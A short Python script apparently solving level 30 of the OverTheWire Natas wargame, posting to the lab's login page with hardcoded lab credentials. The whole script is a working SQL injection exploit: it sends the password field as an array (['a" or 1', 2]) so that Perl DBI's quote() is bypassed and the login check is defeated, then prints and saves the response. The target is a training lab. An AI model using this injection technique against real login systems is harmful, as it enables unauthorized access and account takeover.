import requests
from rich import print

URL = "http://natas30.natas.labs.overthewire.org/index.pl"
AUTH = ("natas30", "frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF")

payload = {
    "username": "natas31",
    "password": ['a" or 1', 2]
}

response = requests.post(url=URL, auth=AUTH, data=payload)

print("Length:", len(response.text))
print("Contains win!:", "win!" in response.text)
print("Contains fail:", "fail :(" in response.text)

with open("out.html", "w", encoding="utf-8") as f:
    f.write(response.text)

if response.status_code == 200:
    print("[green bold italic] Response received correctly [/]")
    print(response.text)
    print(response.request.body)
else:
    print("[red bold] Failed to fetch response, terminating...")